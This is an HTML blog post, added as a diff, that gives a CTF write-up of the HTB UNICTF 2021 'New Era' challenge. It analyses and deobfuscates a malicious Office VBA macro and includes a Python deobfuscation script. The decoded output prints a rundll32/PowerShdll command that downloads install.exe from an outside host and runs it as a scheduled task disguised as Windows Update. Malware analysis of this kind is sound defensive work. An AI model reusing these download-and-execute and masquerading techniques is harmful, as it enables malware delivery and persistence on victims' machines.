@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>New Era - [HTB UNICTF 2021 - Finals] :: Hacklagr0y</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This forensics challenge was a malware-analysis challenge with malicious Office macros." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://alagroy-42.github.io/writeups/new_era/" />
+
+
+
+
+<link rel="stylesheet" href="https://alagroy-42.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://alagroy-42.github.io/assets/red.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://alagroy-42.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://alagroy-42.github.io/img/favicon/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="alagroy-" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="New Era - [HTB UNICTF 2021 - Finals]">
+<meta property="og:description" content="This forensics challenge was a malware-analysis challenge with malicious Office macros." />
+<meta property="og:url" content="https://alagroy-42.github.io/writeups/new_era/" />
+<meta property="og:site_name" content="Hacklagr0y" />
+
+  
+    <meta property="og:image" content="https://alagroy-42.github.io/img/favicon/red.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-06-14 18:39:26 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://alagroy-42.github.io/">
+  <div class="logo">
+    Home
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="">About</a></li>
+        
+      
+        
+          <li><a href="/ctfs/">CTFs</a></li>
+        
+      
+        
+          <li><a href="/malware">Malware</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="">About</a></li>
+      
+    
+      
+        <li><a href="/ctfs/">CTFs</a></li>
+      
+    
+      
+        <li><a href="/malware">Malware</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://alagroy-42.github.io/writeups/new_era/">New Era - [HTB UNICTF 2021 - Finals]</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-06-14
+        
+      </span>
+    
+    
+      <span class="post-author">:: alagroy-</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://alagroy-42.github.io/tags/forensics/">Forensics</a>&nbsp;
+    
+    #<a href="https://alagroy-42.github.io/tags/hard/">Hard</a>&nbsp;
+    
+    #<a href="https://alagroy-42.github.io/tags/malware-analysis/">Malware Analysis</a>&nbsp;
+    
+    #<a href="https://alagroy-42.github.io/tags/vba/">VBA</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="the-challenge">The Challenge<a href="#the-challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>For this challenge we had an ISO file that contains <a href="/writeups/new_era/office.doc">this Office document</a>.</p>
+<p>We are gonna use the <code>oletool</code> suite to try to see if there is anything suspicious in that file.</p>
+<p><img src="/new_era_oledump.png" alt="oledump"></p>
+<p>The <code>oledump</code> utility shows us that there are macros that appear suspicious.
+We are gonna use the <code>olevba</code> utility to get more infos on the macros</p>
+<p><img src="/new_era_olevba.png" alt="olevba"></p>
+<p>That definitely looks odd. Nonetheless, when we try to decode the base64 strings, it looks like non-sense so we are gonna try to look at the macro code. The problem is that it&rsquo;s been compiled into assembly so we don&rsquo;t have a direct access to the VBA. We are gonna use a utility called <code>pcode2code</code> to transform back the pcode into human-readable VBA which gives us <a href="/writeups/new_era/raw_macro.vba">this file</a>.</p>
+<p>Good news is that this is human readable-code, bad news is that it is completely obfuscated. So our main task will be to deobfuscate it.
+We can notice a lot of code chunks using the <code>Chr</code> function that converts a number to a char so we can guess that those are hidden strings. By simply copying those in a python file and renaming <code>Chr</code> to <code>chr</code> plus a few minor modifications, we can retrieve them and replace them in the original code.
+For example :
+<code>td.RegistrationInfo.Author = SazX46jj(&quot;m&quot; &amp; Chr(int(&quot;&amp;H4f&quot;)) &amp; Chr(-878 + 958) &amp; Chr(&amp;H32) &amp; &quot;U&quot; &amp; Chr(75) &amp; Chr(-2899 + 3012) &amp; Chr(int(&quot;55&quot;)) &amp; Chr(int(&quot;47&quot;)) &amp; Chr(2158 - 2109) &amp; Chr(int(&quot;&amp;H52&quot;)) &amp; Chr(1501 - 1390) &amp; Chr(int(&quot;112&quot;)) &amp; Chr(476 - 360) &amp; Chr(-1634 + 1716) &amp; Chr(int(&quot;71&quot;)) &amp; Chr(113) &amp; Chr(&amp;H76) &amp; Chr(int(&quot;106&quot;)) &amp; Chr(99) &amp; Chr(int(&quot;&amp;H55&quot;)) &amp; Chr(int(&quot;&amp;H75&quot;)) &amp; Chr(int(&quot;&amp;H43&quot;)) &amp; Chr(&amp;H30) &amp; Chr(47) &amp; Chr(int(&quot;&amp;H46&quot;)) &amp; Chr(88) &amp; Chr(8301 - 8247) &amp; Chr(&amp;H2B) &amp; Chr(int(&quot;108&quot;)) &amp; &quot;9&quot; &amp; Chr(&amp;H64))</code>
+will now be :
+<code>td.RegistrationInfo.Author = deobf_str(&quot;mOP2UKq7/1RoptRGqvjcUuC0/FX6+l9d&quot;)</code></p>
+<p>Every encoded string seems to be another base64 string but they also don&rsquo;t decode into anything readable. However, we can notice that each of the base64-like strings are given to the same function that we will name <code>deobf_str</code>. That gives us the <a href="/writeups/new_era/stage_1.vba">stage_1</a> file that is partially decoded.
+After trying to understand how the script works, we got the <a href="/writeups/new_era/stage_2.vba">stage_2</a> file that has its symbols renamed with a coherent name and also more coherent types.</p>
+<p>Now that we have an approximation of what the <code>deobf_str</code> function does, we will recode it in Python and try to get see what is hidden in the Base64-like strings.
+Here is the corresponding script :</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">python</span>
+      <span class="collapsable-code__title">deobfuscate.py</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-python" ><code>
+from curses.ascii import isdigit, islower, isupper
+import sys
+
+def binary_transform1(elem, op):
+    out = elem
+    if op &gt; 0:
+        if elem &gt; 0:
+            out = int(out / (2 ** op))
+        else:
+            if op &gt; 31:
+                out = 0
+            else:
+                out = out &amp; 0x7FFFFFFF
+                out = int(out / (2 ** op))
+                out = out | (2 ** (31 - op))
+    return out
+
+def binary_transform2(elem, op):
+    out = elem
+    if op &gt; 0:
+        for i in range(op):
+            m = out &amp; 0x40000000
+            out = (out &amp; 0x3FFFFFFF) * 2
+            if m != 0:
+                out = out | 0x80000000
+    return out
+
+def binary_transform3(setup):
+    d1 = 7
+    d2 = 14
+    t = ((setup ^ binary_transform1(setup, d2)) &amp; 52428)
+    u = setup ^ t ^ binary_transform2(t, d2)
+    t = (u ^ binary_transform1(u, d1)) &amp; 5570645
+    out = (u ^ t ^ binary_transform2(t, d1))
+    return out
+
+def crypto_style_mega_binary_transform(pre_final_result):
+    return_value = &#34;&#34;
+    for i in range(len(pre_final_result)):
+        fr = i * 4
+        if fr &#43; 3&gt;= len(pre_final_result):
+            break
+        setup = 0
+        setup = setup | binary_transform2(pre_final_result[fr &#43; 3], 24)
+        setup = setup | binary_transform2(pre_final_result[fr &#43; 2], 16)
+        setup = setup | binary_transform2(pre_final_result[fr &#43; 1], 8)
+        setup |= pre_final_result[fr]
+        raw = binary_transform3(setup)
+        a = chr(binary_transform1(raw &amp; 0xff000000, 24))
+        B = chr(binary_transform1(raw &amp; 16711680, 16))
+        c = chr(binary_transform1(raw &amp; 65280, 8))
+        d = chr(binary_transform1(raw &amp; 255, 0))
+        return_value = return_value &#43; d &#43; c &#43; B &#43; a
+    return return_value
+
+
+
+matrix = [0] * 256
+arr1 = [0] * 64
+arr2 = [0] * 64
+arr3 = [0] * 64
+
+for i in range (256):
+    if isupper(i):
+        matrix[i] = i - 65
+    elif islower(i):
+        matrix[i] = i - 71
+    elif isdigit(i):
+        matrix[i] = i &#43; 4
+    elif i == ord(&#34;&#43;&#34;):
+        matrix[i] = ord(&#34;&gt;&#34;)
+    elif i == ord(&#34;/&#34;):
+        matrix[i] = ord(&#34;?&#34;)
+
+for i in range(64):
+    arr1[i] = i * 64
+    arr2[i] = i * 64 * 64
+    arr3[i] = i * 64 * 64 * 64
+
+arg_str = sys.argv[1]
+pre_final_result = [0] * (int((len(arg_str) &#43; 1) / 4) * 3)
+index_pre_final_result = 0
+
+arg_str_array = [ord(i) for i in arg_str]
+
+for iter in range(0, len(arg_str_array), 4):
+    mega_byte = arr3[matrix[arg_str_array[iter]]] &#43; arr2[matrix[arg_str_array[iter &#43; 1]]] &#43; arr1[matrix[arg_str_array[iter &#43; 2]]] &#43; matrix[arg_str_array[iter &#43; 3]]
+    i = mega_byte &amp; 0xff0000
+    pre_final_result[index_pre_final_result] = int(i / 0x10000)
+    i = mega_byte &amp; 0xff00
+    pre_final_result[index_pre_final_result &#43; 1] = int(i / 0x100)
+    pre_final_result[index_pre_final_result &#43; 2] = mega_byte &amp; 0xff
+    index_pre_final_result &#43;= 3
+
+deobf_str = crypto_style_mega_binary_transform(pre_final_result).strip(&#34;~&#34;)
+print(deobf_str)
+</code></pre>
+  </div>
+
+
+<p>We will give each string to that script and try to see what they are corresponding to :</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="2" type="checkbox"  />
+    <label for="2">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">strs.sh</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-bash" ><code>
+/usr/local/bin/python3 deobfuscate.py &#34;oPhSWfo8/Qbyq3BYqC59Urpr&#43;lGyyHEfqt7uVGiy8VjwrlwV6q3UHqjj8lyoOvlUuCreUfho&#43;1GqWpxDsK7wUappuFOi&#43;/dR0qhwVvCqU0U=&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;Evw9TPCsd1Ui/z1aoL1zXuhzM0yquVhXuGLWGaKHWl342F1d&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;iP7eVuiy8VjwqlwV8KpYFeCj/lTwRFVBuMlMVPKv8xSK4zRToL/wXOI0cBegu/VSsMhQXOg1XR7ik/9VuO/VWbivUlygvnBS6KNUH/Kt/RW44PNd8Kh8FbC68BCwy&#43;Ndkq9YVPjYXV0=&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;ooz2QrAlVxVqoWBQEKSoUGDjwFAApaFQALXEVgClqVAK5SBWAKWoUWjzdVEAralRYOHkUACloVko90RQAKygUWqhVVWAJClZIOPAEBCsqFBo8XVRgCQpWUjzZlCAJClZAPX3VwCkoFEqoURUAKWpUKKK&#43;AjSNlJT&#43;HL8XA==&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;gqV5VqC/WFWi28dQuqfQVg==&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;mOP2UKq7/1RoptRGqvjcUuC0/FX6&#43;l9d&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;au1hUSCmzFVAtcFSGOhzGwD110Z4/llQ6vj1QKKhTV04&#43;lEQKORgEaBmzV3Y4uZQeqx9VYD2f0hY&#43;FdSAPzfRsjr51nyJHFZ&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;qlBUCugWcgwi2FUKulBVCupQV04=&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;uK/UVug&#43;OVDY&#43;l1d&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;mqt4Vqqz8xmAvnBS6OtcXw==&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;&#43;q94VrLvdFlymE4fyL7fVvi2wFPocndd&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;&#43;q94VrLvdFlymE4fyL7fVvi2wFPocndd&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;&#43;q94VrLvdFlymE4fyL7fVvi2wFPocncZmu98EjLRRVui7/dQ&#43;vh9Xw==&#34;
+/usr/local/bin/python3 deobfuscate.py &#34;ivPlUuC4dhzSqPBW&#43;PpfXQ==&#34;
+</code></pre>
+  </div>
+
+
+<pre tabindex="0"><code>➜  forensics_newera sh strs
+https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dl
+C:\Windows\System32\rundll32.exe 
+\powershdll.dll,main . { Invoke-WebRequest -useb https://windowsliveupdater.com/install.exe -OutFile 
+C:\ProgramData\windows\install.exe
+; echo &#39;cABhAHIAdAAxACAAPQAgACIASABUAEIAewBzAGMAaAAzAGQAdQBsADEAbgBnAF8AdAA0AHMAawBzAF8AMQBzAF8AYwAwADAAbABfACIA&#39; } ^| iex;
+Schedule.Service
+Microsoft Corporation
+cGFydDIgPSAiYnV0X3AwdzNyc2gzbGxfdzF0aDB1dF9wMHczcnNoM2xsXzFzX2MwMGwzcn0i
+2022-02-22T22:22:22
+tigger.ID
+C:\ProgramData\windows\install.exe
+Windows Update
+winmgmts:\\.\root\cimv2
+winmgmts:\\.\root\cimv2
+winmgmts:\\.\root\cimv2:Win32_Process
+WScript.Shell
+</code></pre><p>That definetly looks like a shady macro and there is a particularly peculiar string in those which is</p>
+<pre tabindex="0"><code>; echo &#39;cABhAHIAdAAxACAAPQAgACIASABUAEIAewBzAGMAaAAzAGQAdQBsADEAbgBnAF8AdAA0AHMAawBzAF8AMQBzAF8AYwAwADAAbABfACIA&#39; } ^| iex;
+</code></pre><p>Once decoded, the base64 string gives us <code>part1 = &quot;HTB{sch3dul1ng_t4sks_1s_c00l_&quot;</code>. We guess that the second part is in the other base64 string which gives us, once decoded : <code>part2 = &quot;but_p0w3rsh3ll_w1th0ut_p0w3rsh3ll_1s_c00l3r}&quot;</code>. We now have the full flag.</p>
+
+      </div></div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://alagroy-42.github.io/assets/main.js"></script>
+<script src="https://alagroy-42.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
